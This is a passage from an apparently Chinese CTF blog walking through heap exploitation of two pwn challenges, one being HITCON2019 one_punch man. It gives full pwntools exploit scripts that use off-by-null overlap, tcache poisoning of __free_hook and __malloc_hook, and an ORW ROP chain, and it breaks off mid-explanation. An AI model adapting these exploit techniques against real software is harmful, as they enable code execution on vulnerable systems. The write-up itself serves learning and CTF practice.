class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序要进行攻击的话,首先得成功通关关卡</p><p>需要通关有需要先取得GM权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)mp5070[<span class="number">6</span> * dword_504C] &gt; <span class="number">0x5F5E0FE</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     dword_5058 = <span class="number">1</span>;</span><br><span class="line">     LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Welcome GAME MASTER&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到再进行比较的时候事先将mp转为无符号了</p><p>而在购买其他物品时,只比较了金钱是否大于0,而没有比较是否大于价格</p><p><strong>取得权限:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>在不合并的前提下释放两个非tcache范围内chunk再取出使他们的bk位置写上堆地址和libc地址,fd位因为一定会被覆盖一些所以不行</p><p>这样就得到了libc地址和堆地址(堆地址用于之后绕过overlap时的unlink)</p><p>程序在edit_player的时候会存在off-by-null漏洞</p><p>可以利用其向前overlap(非tcache chunk)</p><p>从而进一步达到uaf(两个指针指向同一个chunk)</p><p>将free_hook挂载入tcache中,之后取出(注意对应的counts[tc_idx]的值要先拉高)</p><p>之后就是常规的操作了</p><p><strong>exp:</strong></p><p>不知道是不是一开始的交互函数没写好,导致程序交互总是莫名其妙的卡住,五六次使用脚本只有一次符合预期,调试的时候可以说是极其折磨了,折腾了一天</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Size\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Data\n&#x27;</span>,(content))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Change?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Your Log:&#x27;</span>,content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;User?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">game()</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)<span class="comment">#防止两个chunk合并</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)<span class="comment">#防止与topchunk合并</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">3</span>)</span><br><span class="line">libc_address=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">1</span>)</span><br><span class="line">heap_3=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=libc_address-<span class="number">96</span>-<span class="number">0x1ebb80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_3))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">heap_5=heap_3+<span class="number">0x840</span><span class="comment">#调试计算</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_5))<span class="comment">#记录地址</span></span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)<span class="comment">#off-by-null</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x10</span>)<span class="comment">#防止与topchunk合并</span></span><br><span class="line">edit(<span class="number">5</span>,p64(heap_3-<span class="number">0x8</span>)+p64(heap_3)+p64(<span class="number">0x20</span>))<span class="comment">#绕过合并时的unlink检测,prev_size记得填</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)<span class="comment">#触发合并</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x110</span>)<span class="comment">#现在10和5指向同一个chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x110</span>)<span class="comment">#拉高对应count[idx]</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(free_hook))<span class="comment">#挂载hook</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x110</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x110</span>,p64(system))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0x10-0x12</strong></p><h2 id="HITCON2019-one-punch-man"><a href="#HITCON2019-one-punch-man" class="headerlink" title="HITCON2019-one_punch man"></a>HITCON2019-one_punch man</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/op&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>and沙盒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p><strong>主要利用的就是retire这个函数在free后没有置零,从而可以uaf</strong></p><p>程序有一个backdoor函数,但是直接看可以看到其本身也只是常规的申请chunk</p><p>不存在什么特殊功能</p><p>不过这题看正常分配chunk函数用的是calloc</p><p>因此不会直接取出tcache中的chunk</p><p>因此就需要用到backdoor中的malloc去除tcache来进行攻击了</p><p>libc版本是2.29,unsortedbin attack被削废了</p><p>难度不小,看了看师傅们的博客</p><p>主要有两种思路</p><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>主要是利用tcache在bins中找到所需的chunk后会将多余的该chunk填充入未满的tcache,来达到类似unsortedbin的攻击方式</p><ol><li>泄露heap基址,libc基址</li><li>利用unsorted切割割出两个small chunk</li><li>uaf写后来的small chunk的bk为目的地址</li><li>申请一个0x220的chunk,利用uaf写fd为__malloc_hook</li><li>申请small chunk,触发放入tcache</li><li>backdoor申请出__malloc_hook</li><li>写__malloc_hook为跳转栈到可控区</li><li>在栈上构造orw_rop流,通过__malloc_hook调用</li></ol><p>small chunk之所以不直接申请对应大小,是因为要使得他能放入small bin就需要tcache满,而tcache满就无法触发放入tcache</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./op&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./op&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#some gadgets</span></span><br><span class="line"><span class="comment"># 0x000000000008cfd6: add rsp, 0x48; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000026542: pop rdi; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000012bdcgot9: pop rdx; pop rsi; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line"><span class="comment"># 0x00000000000cf6c5: syscall; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">p=process(<span class="string">&#x27;./op&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">heap_base=u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x260</span></span><br><span class="line">info(<span class="string">&quot;heap : &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">alloc(i,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x108</span>+<span class="string">b&quot;flag.txt&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x8</span>+<span class="number">0x1f0</span>)+p64(<span class="number">0x101</span>)+p64(heap_base+<span class="number">0x27d0</span>)+p64(heap_base+<span class="number">0x30</span>-<span class="number">0x10</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">cmd(<span class="number">50056</span>)</span><br><span class="line">p.send(<span class="string">b&quot;C&quot;</span>*<span class="number">8</span>)</span><br><span class="line">cmd(<span class="number">50056</span>)</span><br><span class="line">p.send(p64(libc.address+<span class="number">0x000000000008cfd6</span>))</span><br><span class="line">p_rdi = <span class="number">0x0000000000026542</span>+libc.address</span><br><span class="line">p_rdx_rsi = <span class="number">0x000000000012bdc9</span>+libc.address</span><br><span class="line">p_rax = <span class="number">0x0000000000047cf8</span>+libc.address</span><br><span class="line">syscall_ret = <span class="number">0x00000000000cf6c5</span>+libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(p_rdi)+p64(heap_base+<span class="number">0x2df8</span>)+p64(p_rdx_rsi)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(p_rax)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rdx_rsi)+p64(<span class="number">0x80</span>)+p64(heap_base+<span class="number">0x2d00</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">0</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">2</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&#x27;</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>通过在tcache上伪造chunk,通过对chunk的count联合伪造size,0x20,0x30chunk的地址伪造fd,bk,以此进行unlink</p><ol><li>泄露heap基址,libc基址</li><li>利用前一个泄露libc的chunk(其它chunk也行)来uaf,并多次double free布置tcache结构体中的fake 